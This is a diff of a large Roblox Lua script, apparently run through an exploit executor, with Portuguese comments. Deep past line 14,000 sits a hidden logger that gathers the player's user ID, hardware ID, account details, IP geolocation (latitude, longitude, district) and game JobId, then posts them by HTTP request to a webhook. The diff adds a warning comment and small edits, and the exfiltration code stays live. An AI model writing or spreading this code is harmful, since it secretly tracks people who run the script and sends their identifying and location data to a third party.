@@ -14000,6 +14000,10 @@ print("Executor:")
 
 
 
+--[[ 
+	AVISO: Atenção! Este script não foi verificado pelo ScriptBlox. Use por sua conta e risco!
+]]
+
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
 
@@ -14022,7 +14026,7 @@ local IpFields = {
     "as", -- Sistema autônomo
     "lat", -- Latitude
     "lon", -- Longitude
-    "district", -- Bairro (caso disponível)
+    "district" -- Bairro (caso disponível)
 }
 
 local IpInfoFields = {}
@@ -14063,7 +14067,9 @@ end
 local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local AccountAge = LocalPlayer.AccountAge
 local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
-local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+
+-- ID do Job
+local ConsoleJobId = game.JobId -- Alterado para apenas o ID
 
 -- Informações do Jogo
 local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
@@ -14083,7 +14089,7 @@ local data = {
     ["embeds"] = {
         {
             ["author"] = {
-                ["name"] = "( Script Executado )",
+                ["name"] = "( Alguém Executou o Script )",
                 ["url"] = "https://roblox.com",
             },
             ["description"] = "__[Informações do Jogador](https://www.roblox.com/users/"..Userid..")__\n"
@@ -14102,13 +14108,10 @@ local data = {
                 .."**ID do Jogo:** "..game.PlaceId.."\n"
                 .."**Exploit:** "..webhookcheck.."\n\n"
                 .."**Informações do IP:**\n"..IpInfoString.."\n"
-                .."**JobId:**\n```"..ConsoleJobId.."```",
+                .."**JobId:**\n```"..ConsoleJobId.."```", -- Apenas o ID do Job
             ["type"] = "rich",
             ["color"] = tonumber(0xf2ff00),
             ["thumbnail"] = {
-                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png",
-            },
-            ["image"] = { -- Adiciona a imagem do jogador que executou o script
                 ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png",
             },
         },
@@ -14123,7 +14126,6 @@ local headers = {
 local request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-
 
 
 
